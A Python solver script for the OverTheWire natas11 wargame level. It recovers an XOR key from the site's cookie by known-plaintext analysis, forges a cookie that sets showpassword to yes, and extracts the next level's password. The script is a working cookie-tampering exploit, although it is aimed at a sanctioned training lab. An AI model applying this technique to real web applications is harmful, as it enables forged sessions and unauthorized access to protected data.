import requests
import sys
import base64
import re
import urllib.parse
import time

url = "http://natas11.natas.labs.overthewire.org/"
auth = ("natas11", "secret")

cook_web = ""
mr_key = ""
key = ""

print("[. . .]Connecting")
time.sleep(1.5)
web_get = requests.get(url=url, auth=auth)
if 'data' in web_get.cookies:
    cook_web += web_get.cookies['data']
    print(f"[+] Cookie was founded! The cookie: {cook_web}")
else:
    sys.exit["[-]Cookie wasn't added to current session."]

time.sleep(1.5)

print("[*]Decoding and decrypting the key.")
decode1 = urllib.parse.unquote(cook_web)
decode2 = base64.b64decode(decode1)
known_json = '{"showpassword":"no", "bgcolor":"#ffffff"}'
json_bytes = known_json.encode('utf-8')
key_pattern = bytearray()
for j_byte, c_byte in zip(json_bytes, decode2):
    key_pattern.append(j_byte ^ c_byte)

mr_key += key_pattern.decode('utf-8')
flag = re.search(r"([A-Za-z]{4})", mr_key, re.IGNORECASE)
time.sleep(1.5)
if flag:
    key += flag.group(1)
    print(f"[+]Successfully Decoded! the key is: {key}")
else:
    sys.exit("[-]Key wasn't decoded.")
time.sleep(1.5)

print("[*]Encode a changed cookie.")
chg_json = '{"showpassword":"yes", "bgcolor":"#ffffff"}'

encode1 = chg_json.encode('utf-8')
encode2 = key.encode("utf-8")
cipher_bytes = bytearray()
for i in range(len(encode1)):
    cipher_bytes.append(encode1[i] ^ encode2[i % len(encode2)])

encode3 = base64.b64encode(cipher_bytes).decode('utf-8')
encode_final = urllib.parse.quote(encode3)
time.sleep(1.5)
print(f"[*]Finall cookie: {encode_final}")
time.sleep(1.5)
print("[*]Finding the password in response text.")
pay_cook = {
    "data": encode_final
}

time.sleep(1.5)

web_get2 = requests.get(url=url, cookies=pay_cook, auth=auth)
flag2 = re.search(r"for natas12 is ([A-Za-z0-9]{32})", web_get2.text, re.IGNORECASE)
if flag2:
    print(f"[+]Finnally! Your Password Is: {flag2.group(1)}")
else:
    print("[-]Error to find the password. Try to find it!")
    print(web_get2.text)